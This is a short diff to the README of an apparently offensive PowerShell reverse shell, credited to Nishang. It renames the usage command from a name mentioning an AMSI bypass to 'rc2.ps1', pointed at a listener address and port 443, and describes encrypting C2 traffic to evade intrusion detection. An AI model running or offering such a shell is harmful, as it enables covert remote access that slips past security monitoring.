@@ -3,7 +3,7 @@
 This script is based on Nishang's, thanks for sharing<br>
 
 ```sh
-.\RevershellTCPEncrypt_BypassAMSI.ps1 192.168.1.6 443
+.\rc2.ps1 192.168.1.6 443
 ```
 
 This shell allows you to encrypt your C2, at the network transfer level at the transport and application layers mitigating the detection of rule anomalies of some IPs/IDs.<br>
